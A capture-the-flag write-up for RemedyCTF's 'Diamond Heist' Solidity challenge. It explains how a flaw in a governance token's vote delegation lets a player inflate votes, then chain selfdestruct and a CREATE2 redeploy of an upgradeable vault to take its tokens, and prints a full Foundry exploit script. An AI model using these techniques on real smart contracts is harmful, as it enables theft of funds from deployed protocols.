# Diamond Heist

> [!NOTE]  
> \[🟢]&ensp;**EASY**:&emsp;`39` solves

<br />

"Diamond Heist" was an **easy**-difficulty challenge released at the beginning of the **RemedyCTF**. It was one of the tasks related to the `Solidity` category. Its description tells participants to _recover all diamonds_ and _keep them safe_. Note that description mentions _self-destruct_.

<br />

> Agent, we are in desperate need of your help. The King's diamonds have been stolen by a DAO and are locked in a vault. They are currently voting on a proposal to burn the diamonds forever!<br/><br/>
> Your mission, should you choose to accept it, is to recover all diamonds and keep them safe until further instructions.<br/>
> Good luck.<br/>
> This message will self-destruct in 3.. 2.. 1..<br/>

<br />

## 📑&ensp;TLDR

The goal is to get all of the **Diamonds** stored in the `Vault`. Due to a logic flaw in the voting power delegation system, the malicious user can abuse the `delegate()` function of the governance `ERC-20` token contract `HexensCoin` and generate just enough votes to successfully pass the `AUTHORITY_THRESHOLD` check to be able to call the `governanceCall()` function of the `Vault` contract, which allows to call any other function of this contract.<br/><br/>The malicious user can not call the inherited `upgradeToAndCall()` / `upgradeTo()` functions to upgrade the `Vault`, the `UUPSUpgradeable` proxy implementation contract, because of the overriden `_authorizeUpgrade()` function, which now requires the `Vault` to be out of **Diamonds** to authorize an upgrade. However, it is possible to call the `burn()` function: transfer **Diamonds** from the `Vault` and `selfdestruct` the `Burner` contract.<br/><br/>Since the `Burner` was deployed by the `Vault` with the use of the `CREATE` opcode, but the `Vault` itself was deployed by the `VaultFactory` with the use of the `CREATE2` opcode and the arbitrary `salt` value, the user may upgrade the _empty_ `Vault` to redeploy it and create a fake `Burner` to replace the old one and transfer **Diamonds** to the player.

<br />

## 🔍&ensp;Analysis

### What is the goal? 📍

By analyzing the `isSolved` function of the `Challenge.sol` file, we can find out the conditions needed to get the flag:
```solidity
contract Challenge {
    ...
    uint constant public DIAMONDS = 31337;

    ...

    function isSolved() external view returns (bool) {
        return diamond.balanceOf(PLAYER) == DIAMONDS;
    }
}
```

> [!IMPORTANT]  
> The main goal throughout the task is to **make the `PLAYER` balance greater equal `31337` Diamonds**.

<br />

### What is going on? ⚙️

#### This CTF task:&ensp;`HexensCoins` 🪙

The players are provided with the following set of the Solidity code files:

- `Challenge.sol`
    > The `Challenge` contract used to set up the challenge state, mint `31337` **Diamonds** and lock them up in the `vault`, mint `10_000 ether` worth of **Hexens Coins** and give them out to the player upon the call of the `claim()` function.
    
- `Burner.sol`
    > The `Burner` contract with a `destruct()` function that performs a `selfdestruct` call to itself.

<br/>

- `Diamond.sol`
    > The `ERC20` `Diamond` contract, implements `ERC-20` tokens, a currency known here as **Diamonds**.

- `HexensCoin.sol`
    > The `ERC20` `HexensCoin` contract, implements a governance `ERC-20` token contract. The number of **Hexens Coins** the player has correlates with the number of votes. This contract is the owner of the upgradeable `Vault`.

<br/>

- `VaultFactory.sol`
    > The `VaultFactory` contract, creates a new `Vault` as a new `ERC1967Proxy` object of the `Vault` proxy implementation.

- `Vault.sol`
    > The `UUPSUpgradeable` \(!\) `Vault` proxy implementation contract that stores the locked **Diamonds**.
    
    It has the following functions:
    - `governanceCall`:&ensp;–&ensp;An `external` function, which allows the governance contract / the owner of the `Vault` (`owner()`) or any player with a sufficient number of votes (`getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD`) to call any of this contract's functions (`address(this).call(data)`).
        ```solidity
        function governanceCall(bytes calldata data) external {
            require(msg.sender == owner() || hexensCoin.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD);
            (bool success,) = address(this).call(data);
            require(success);
        }
        ```

    - `burn`:&ensp;–&ensp;An `external` function, which allows the governance contract / the owner of the `Vault` (`owner()`) or the vault itself (`address(this)`) to destroy `amount` of `token`: create a new `Burner`, transfer `amount` of `token` to the `burner` and execute `selfdestruct` on the `burner`.
        ```solidity
        function burn(address token, uint amount) external {
            require(msg.sender == owner() || msg.sender == address(this));
            Burner burner = new Burner();
            IERC20(token).transfer(address(burner), amount);
            burner.destruct();
        }
        ```
    
    - `_authorizeUpgrade`:&ensp;–&ensp;An `internal` function used to determine whether an upgrade is authorized: whether the upgrade request was initiated by the governance contract / the owner of the `Vault` (`owner()`) or the vault itself (`address(this)`) and whether the `Vault` has `0` **Diamonds** stored.
        ```solidity
        function _authorizeUpgrade(address) internal override view {
            require(msg.sender == owner() || msg.sender == address(this));
            require(IERC20(diamond).balanceOf(address(this)) == 0);
        }
        ```


<br/>

> [!NOTE]  
> It is also important to note that the **EVM version** used in this task, according to the `foundry.toml`, – is **`shanghai`**:
> ```toml
> [profile.default]
> src = "src"
> out = "out"
> libs = ["lib"]
> solc = "0.8.13"
> evm_version = "shanghai"
> optimizer = false
> 
> fs_permissions = [{ access = 'read-write', path = '/'}]
> ```

**`selfdestruct`** was deprecated during the **Shanghai** Ethereum upgrade as called for by [`EIP-6049`](https://eips.ethereum.org/EIPS/eip-6049).

<br />

#### Original CTF task:&ensp;`SaltyPretzels` 🥨

This challenge is a reincarnation of a **Diamond Heist** task first seen on the [**HackTM CTF**](https://ctftime.org/event/1848/) Quals held in 2023.

The _fundamental difference_ between them, apart from the fact that `SaltyPretzels` are being called `HexensCoins` now, is that the `Vault` contract found in the source code of the original challenge had a `flashloan()` function, which is not present in the implementation of the task the players are provided with on [**RemedyCTF**](https://ctftime.org/event/2618/) in 2025:
```solidity
function flashloan(address token, uint amount, address receiver) external {
    uint balanceBefore = IERC20(token).balanceOf(address(this));
    IERC20(token).transfer(receiver, amount);
    IERC3156FlashBorrower(receiver).onFlashLoan(msg.sender, token, amount, 0, "");
    uint balanceAfter = IERC20(token).balanceOf(address(this));
    require(balanceBefore == balanceAfter);
}
```

This `flashloan()` function was originally exploited by the players to fulfill the `require(IERC20(diamond).balanceOf(address(this)) == 0)` condition present within the `_authorizeUpgrade()` function of the `Vault`.

<br/>

### What is the potential attack vector? 🗡

#### Infinite `HexensCoins` 🪙

The `HexensCoin` contract is a governance `ERC-20` token contract implementation. It determines each player's voting power based on their balance of **Hexens Coins**, thus the number of **Hexens Coins** the player has correlates with the number of votes.

The only way for the players to get the right to call the `governanceCall()` function is to have enough votes. The number of **Hexens Coins** that belong to the player must be higher than or equal to the `AUTHORITY_THRESHOLD`, which is set to be `100_000 ether`:
```solidity
...
contract Vault is Initializable, UUPSUpgradeable, OwnableUpgradeable {

    uint constant public AUTHORITY_THRESHOLD = 100_000 ether;

    ...

    function governanceCall(bytes calldata data) external {
        require(msg.sender == owner() || hexensCoin.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD);
        (bool success,) = address(this).call(data);
        require(success);
    }
    ...
}
```

Initially, players are only able to `claim()` a sum which is 10 times lower than the `AUTHORITY_THRESHOLD` – `10_000 ether` worth of **Hexens Coins**.

<br/>

The `HexensCoin` contract implements its own `_delegate()` and `_moveDelegates()` functions which allow users to delegate their votes to other users:

```solidity
...
contract HexensCoin is ERC20("HexensCoin", "HEX"), Ownable {
    ...
    function delegate(address delegatee) external {
        return _delegate(msg.sender, delegatee);
    }

    function _delegate(address delegator, address delegatee)
        internal
    {
        address currentDelegate = _delegates[delegator];
        uint256 delegatorBalance = balanceOf(delegator);
        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }

    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep && amount > 0) {
            if (srcRep != address(0)) {
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld - amount;
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld + amount;
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }
    ...
}
```

1. User A calls the `external` `delegate()` function and specifies the `address` of the User B as a `delegatee`.
2. `delegate()` function initiates the execution of the `internal` `_delegate()` function:
    - It sets the delegatee (B) of the delegator (A) and the delegator's (A) balance of **Hexens Coins**.
    - And then it calls the `internal` `_moveDelegates()` function to transfer the delegator's (A) **votes** to the delegatee (B).
3. `_moveDelegates()` function checks whether the `srcRep`, the _previous_ delegatee (C), is not the same as the `dstRep`, the _new_ delegatee (B), (`srcRep != dstRep`) and the `amount` transfered is greater than `0`, and then:
    - If the _previous_ delegatee's (C) address is NOT `address(0)`:&ensp;the `amount` of votes is **subtracted** from the original number of votes that belong to the _previous_ delegatee (C), `srcRepOld`, and the new value of votes, `srcRepNew`, is written into the checkpoint for this delegatee (C).
    - If the _new_ delegatee's (B) address is NOT `address(0)`:&ensp;the `amount` of votes is **added** to the original number of votes that belong to the _new_ delegatee (B), `dstRepOld`, and the new value of votes, `dstRepNew`, is written into the checkpoint for this delegatee (B).

<br/>

> [!IMPORTANT]  
> According to this execution flow:
> - If the delegator's address == the delegatee address (`srcRep == dstRep`):&ensp;`_moveDelegates()` does not do anything.
>
> - If the `amount` of votes being transferred == `0`:&ensp;`_moveDelegates()` does not do anything.
>
> - If the delegator's address == `address(0)` (`srcRep == address(0)`):&ensp;`_moveDelegates()` does NOT **subtract** the votes from the original number of votes that belong to the delegator, `srcRepOld`
>   - `[+]`&ensp;If the delegatee's address != `address(0)`:&ensp;`_moveDelegates()` **adds** new **votes** TO the _new_ delegatee, but does NOT **subtract** them FROM the _previous_ delegatee!
>   - This fact is supported by the implementation of the `mint()` function in the `HexensCoin` contract:&ensp;there `_moveDelegates()` is called with `address(0)` specified as the delegator's address.
>   ```solidity
>     function mint(address _to, uint256 _amount) public onlyOwner {
>        _mint(_to, _amount);
>        _moveDelegates(address(0), _delegates[_to], _amount);
>    }
>   ```
>
> - If the delegatee's address == `address(0)` (`dstRep == address(0)`):&ensp;`_moveDelegates()` does NOT **add** the votes to the original number of votes that belong to the delegatee, `srcRepOld`, and only **burns** old **Hexens Coins**!
>   - `[-]`&ensp;If the delegator's address != `address(0)`:&ensp;`_moveDelegates()` **subtracts** the **votes** FROM the _previous_ delegatee, but does NOT **add** them TO the _new_ delegatee!

<br/>

#### `selfdestruct` & `CREATE2` 💣

Imagine the malicious user somehow bypasses the `AUTHORITY_THRESHOLD` and gets the right to call the `governanceCall()` function, which allows to call **any** of the target contract's functions. Then, since `Vault` is an `UUPSUpgradeable` proxy implementation contract, the user might want to call the inherited `upgradeToAndCall()` / `upgradeTo()` functions which can be used to upgrade the implementation contract of the `Vault` to "rescue" the tokens and solve the task.

But the `_authorizeUpgrade()` is overriden and comes in the current implementation of the `Vault` with an _extra check_:&ensp;the `Vault` must have `0` **Diamonds** stored in it to authorize an upgrade.
```solidity
    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }
```

Therefore, to successfully upgrade the implementation contract of the `Vault`, the `Vault` must be left with **NO Diamonds** prior to the call of the `upgradeToAndCall()` / `upgradeTo()` via the `governanceCall()`.

The only way to drain the `Vault` so far is to transfer all of its funds to the `Burner`, but this action initiates the `Burner`'s `selfdestruct`, which ultimately destroys the **Diamonds**. However:

- There must be a way to deploy a new version of the `Burner` to the same address after its destruction to include a new functionality that would allow us to restore the **Diamonds** taken from the `Vault`.

- Since the `Burner` was deployed by the `Vault` using the `CREATE` opcode, the address is determined by the factory contract's address and nonce. In order to successfully redeploy the `Burner`, there must be a way to redeploy a new version of the `Vault` to the same address.

- Since the `Vault` was deployed with the use of the `VaultFactory` using the `CREATE2` opcode, the address is determined by an arbitrary `salt` value (in our case it is `"The tea in Nepal is very hot. But the coffee in Peru is much hotter."`), which makes it possible to redeploy the `Vault`.

<br />

## 🔓&ensp;Solution

### Infinite `HexensCoins` 🪙

Since `_moveDelegates()` can essentially be used to **add** new **votes**, the malicious user is able to exploit this behavior and thus increase their voting power by following these steps **in a loop**:

```solidity
contract Exploit {
    ...
    function exploit() public {
        VoteCollector voteCollector = new VoteCollector(setup);

        while (
            hexensCoin.getCurrentVotes(address(voteCollector)) <
            vault.AUTHORITY_THRESHOLD()
        ) {
            ...
        }
        ...
    }
}
```

1. The malicious user calls the `delegate()` `external` function and specifies the "collector" contract as their delegatee. All of their **votes** are transferred TO the "collector" contract.

    ```solidity
    {
        hexensCoin.delegate(address(voteCollector));
        ...
    }
    ```

2. The malicious user transfers all of their **Hexens Coins** TO the "collector" contract so that it stores their **Hexens Coins**, whilst their local balance of **Hexens Coins** == `0`.
    ```solidity
    {
        hexensCoin.delegate(address(voteCollector));
        
        hexensCoin.transfer(address(voteCollector), setup.HEXENS_COINS());
        ...
    }
    ```

3. The malicious user calls the `delegate()` `external` function and specifies the `address(0)` as the address of their new delegatee:
    - `_delegate()` sets the `address(0)` as the new user's delegatee.
    - `_moveDelegates()` does not do anything, since the delegator's balance of **Hexens Coins** == `0`.

    ```solidity
    {
        hexensCoin.delegate(address(voteCollector));
        
        hexensCoin.transfer(address(voteCollector), setup.HEXENS_COINS());
        hexensCoin.delegate(address(0));
        ...
    }
    ```

4. The malicious user transfers back all of their **Hexens Coins** FROM the "collector" contract.

    ```solidity
    {
        hexensCoin.delegate(address(voteCollector));
        
        hexensCoin.transfer(address(voteCollector), setup.HEXENS_COINS());
        hexensCoin.delegate(address(0));
        
        hexensCoin.transferFrom(
            address(voteCollector),
            address(this),
            setup.HEXENS_COINS()
        );
    }

5. The next time the malicious user calls the `delegate()` `external` function and specifies an address of the "collector" contract controlled by them as their delegatee:
    - `_delegate()` sets the "collector" contract as the new user's delegatee.
    - `_moveDelegates()` does NOT **subtract** **votes** FROM the _previous_ delegatee, since its address == `address(0)`, but **adds** **votes** TO the _new_ delegatee, the "collector" contract.

<br/>

Successful exploitation grants the malicious users with just enough votes to earn the right to call the `governanceCall()` function.

<br />

### `selfdestruct` & `CREATE2` 💣

To deploy a new version of the `Burner` to the same address after its destruction to include a new functionality that would allow us to restore the **Diamonds** taken from the `Vault` after we empty the `Vault` to authorize an upgrade:

1. Define the `Destructor` contract that would execute `selfdestruct` in the context of the `Vault` proxy. This contract utilizes the storage slot used by the proxy implementation in accordance with the [`ERC-1967`](https://eips.ethereum.org/EIPS/eip-1967).
    ```solidity
    contract Destructor {
        function destruct() public {
            selfdestruct(payable(msg.sender));
        }

        function proxiableUUID() external view returns (bytes32) {
            return
                0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        }
    }
    ```

2. Define the `NeploxDiamond` contract to mimic the `Diamond` contract, the `FakeBurner` contract – for the `Burner` and the `TakeOverVault` – for the `Vault`. The `FakeBurner` does not perform `selfdestruct`, but rather transfers all of its **Diamonds** to the player:
    ```solidity
    contract NeploxDiamond is ERC20 {
        constructor() ERC20("NeploxDiamond", "Neplox") {}
    }

    contract FakeBurner {
        constructor(address player, Diamond diamond) {
            diamond.transfer(player, diamond.balanceOf(address(this)));
        }
    }

    contract TakeOverVault {
        function solve(address player, Diamond diamond) external {
            new FakeBurner(player, diamond);
        }

        function proxiableUUID() external view returns (bytes32) {
            return
                0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        }
    }
    ```

3. Call the `governanceCall()` function to execute `burn()` on the `Vault` to transfer all of the **Diamonds** stored in the `Vault` to the new `Burner` and then `selfdestruct` the `Burner`:
    ```solidity
    ...
        vault.governanceCall(
            abi.encodeCall(vault.burn, (address(diamond), 31337))
        );
    ...
    ```

4. As the `Vault` does not have any **Diamonds** anymore, it can be upgraded. Initialize a new `Destructor` object and call the `governanceCall()` function to execute `upgradeTo()` on the `Vault` targeting the `destructor`:
    ```solidity
    ...
        vault.governanceCall(
            abi.encodeCall(vault.burn, (address(diamond), 31337))
        );
        Destructor destructor = new Destructor();
        vault.governanceCall(
            abi.encodeCall(vault.upgradeTo, (address(destructor)))
        );
    ...
    ```

5. Redeploy the `Vault` proxy via the `VaultFactory` with the use of the `salt` that was used during the challenge deployment (`"The tea in Nepal is very hot. But the coffee in Peru is much hotter."`). Initialize it (`vault.initialize()`) and upgrade it to a new version (`vault.upgradeTo(address(takeOverVault))`), which is defined in the `TakeOverVault` contract and utilizes a new version of the `Burner`, which is defined in the `FakeBurner` contract and transfers `31337` **Diamonds** required to solve the task to the player:

    ```solidity
    ...
        VaultFactory vaultFactory = challenge.vaultFactory();
        Vault vault = vaultFactory.createVault(
            keccak256(
                "The tea in Nepal is very hot. But the coffee in Peru is much hotter."
            )
        );
        vault.initialize(address(new NeploxDiamond()), address(0x0));
        TakeOverVault takeOverVault = new TakeOverVault();
        vault.upgradeTo(address(takeOverVault));
        console.log("Address of vault:", address(vault));
        TakeOverVault(address(vault)).solve(player, challenge.diamond());
    ...
    ```

<br />

### Exploitation ⚠️

> `[+]` Have a look at the full script:&ensp;[`Solve.s.sol`](./Solve.s.sol) <br />
> `[*]` Execute the script with this command:
> ```bash
> forge script -f '{CTF_RPC_URL}' --broadcast ./script/Solve.s.sol
> ```

<br />

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/Challenge.sol";
import "src/Vault.sol";
import "src/Diamond.sol";
import "src/HexensCoin.sol";
import "forge-std/Script.sol";
import {ERC20} from "src/openzeppelin-contracts/token/ERC20/ERC20.sol";

contract Exploit {
    // Challenge contracts
    Challenge public setup;
    Vault public vault;
    HexensCoin public hexensCoin;

    constructor(Challenge _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        hexensCoin = setup.hexensCoin();

        // Claim initial hexensCoin tokens
        setup.claim();
    }

    function exploit() public {
        // Create a contract to hoard votes
        VoteCollector voteCollector = new VoteCollector(setup);

        // Loop while VoteCollector has not enough votes
        while (
            hexensCoin.getCurrentVotes(address(voteCollector)) <
            vault.AUTHORITY_THRESHOLD()
        ) {
            // Add our votes to VoteCollector
            hexensCoin.delegate(address(voteCollector));

            // Set our delegatee to address(0)
            hexensCoin.transfer(address(voteCollector), setup.HEXENS_COINS());
            hexensCoin.delegate(address(0));

            // Regain our hexensCoin tokens
            hexensCoin.transferFrom(
                address(voteCollector),
                address(this),
                setup.HEXENS_COINS()
            );
        }

        // When VoteCollector has enough votes, steal the vault's diamonds
        voteCollector.stealDiamonds();
    }
}

contract VoteCollector {
    // Challenge contracts
    Challenge public setup;
    Vault public vault;
    Diamond public diamond;
    HexensCoin public hexensCoin;

    constructor(Challenge _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        diamond = setup.diamond();
        hexensCoin = setup.hexensCoin();

        // Allow the Exploit contract to transfer all of this contract's hexensCoin tokens
        hexensCoin.approve(msg.sender, type(uint256).max);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        Burner(to).destruct();
        Burner(to).destruct();
        Burner(to).destruct();
        return true;
    }

    function stealDiamonds() public {
        vault.governanceCall(
            abi.encodeCall(vault.burn, (address(diamond), 31337))
        );
        Destructor destructor = new Destructor();
        vault.governanceCall(
            abi.encodeCall(vault.upgradeTo, (address(destructor)))
        );
        Destructor(address(vault)).destruct();
    }
}

contract Destructor {
    function destruct() public {
        selfdestruct(payable(msg.sender));
    }

    function proxiableUUID() external view returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}

contract NeploxDiamond is ERC20 {
    constructor() ERC20("NeploxDiamond", "Neplox") {}
}

contract FakeBurner {
    constructor(address player, Diamond diamond) {
        diamond.transfer(player, diamond.balanceOf(address(this)));
    }
}

contract TakeOverVault {
    function solve(address player, Diamond diamond) external {
        new FakeBurner(player, diamond);
    }

    function proxiableUUID() external view returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}

contract Solve is Script {
    function step1() external {
        uint256 key = vm.envUint("KEY");
        address player = vm.rememberKey(key);
        console.log("Player address:", player);
        Challenge challenge = Challenge(vm.envAddress("CHALL"));
        console.log("Challenge address:", address(challenge));
        vm.startBroadcast(player);
        Exploit exploit = new Exploit(challenge);
        exploit.exploit();
        vm.stopBroadcast();

        // require(challenge.isSolved(), "Challenge not solved");
    }

    function step2() external {
        uint256 key = vm.envUint("KEY");
        address player = vm.rememberKey(key);
        console.log("Player address:", player);
        Challenge challenge = Challenge(vm.envAddress("CHALL"));
        console.log("Challenge address:", address(challenge));
        vm.startBroadcast(player);
        VaultFactory vaultFactory = challenge.vaultFactory();
        Vault vault = vaultFactory.createVault(
            keccak256(
                "The tea in Nepal is very hot. But the coffee in Peru is much hotter."
            )
        );
        vault.initialize(address(new NeploxDiamond()), address(0x0));
        TakeOverVault takeOverVault = new TakeOverVault();
        vault.upgradeTo(address(takeOverVault));
        console.log("Address of vault:", address(vault));
        TakeOverVault(address(vault)).solve(player, challenge.diamond());
        vm.stopBroadcast();

        require(challenge.isSolved(), "Challenge not solved");
    }
}
```

<br />

## 📑 See also
- \[ 📗 \]&emsp;**Article**:&ensp;‟UUPS: Universal Upgradeable Proxy Standard (ERC-1822)” by 
Team RareSkills&ensp;[🔗](https://www.rareskills.io/post/uups-proxy)
- \[ 📗 \]&emsp;**Article**:&ensp;‟EIP-6780, selfdestruct, we won't miss you” by Ryan S.&ensp;[🔗](https://rya-sge.github.io/access-denied/2024/03/13/EIP-6780-selfdestruct/)
- \[ 📗 \]&emsp;**Article**:&ensp;‟UUPSUpgradeable Vulnerability Post-mortem” by spalladino&ensp;[🔗](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680)
- \[ 📗 \]&emsp;**Article**:&ensp;‟Pitfalls of Using CREATE, CREATE2 and EXTCODESIZE Opcodes” by Alexander Mazaletskiy&ensp;[🔗](https://mixbytes.io/blog/pitfalls-of-using-cteate-cteate2-and-extcodesize-opcodes)
- \[ 📝 \]&emsp;**Writeup**:&ensp;‟Draining Vaults in HackTM CTF Quals 2023” by Aaron&ensp;[🔗](https://aaronesau.com/blog/post/12)
- \[ 📝 \]&emsp;**Writeup**:&ensp;‟HackTM CTF Quals 2023 - smart contract(Dragon Slayer, Diamond Heist)” by kangsangsoo&ensp;[🔗](https://hodl.page/entry/HackTM-CTF-Quals-2023-smart-contractDragon-Slayer-Diamond-Heist)
- \[ 📝 \]&emsp;**Writeup**:&ensp;‟HackTM CTF Writeup” by rkm0959&ensp;[🔗](https://rkm0959.tistory.com/284)
- \[ 📝 \]&emsp;**Writeup**:&ensp;‟Exploiting smart contracts in HackTM 2023 CTF Quals” by MiloTruck&ensp;[🔗](https://milotruck.github.io/ctf/Exploiting-smart-contracts-in-HackTM-2023-CTF-Quals/#diamond-heist)
- \[ :octocat: \]&emsp;**Repository**:&ensp;‟Diamond Heist” by MiloTruck&ensp;[🔗](https://github.com/MiloTruck/smart-contract/blob/main/ctf/hacktm-2023/diamond-heist/README.md)
- \[ :octocat: \]&emsp;**Repository**:&ensp;‟Diamond Heist” by C0nstellati0n&ensp;[🔗](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/HackTM%20CTF/Web/Diamond%20Heist.md)
- \[ :octocat: \]&emsp;**Repository**:&ensp;‟HackTM CTF 2023 : Diamond Heist” by Kaiziron&ensp;[🔗](https://github.com/Kaiziron/hacktm2023_writeup/blob/main/DiamondHeist.md)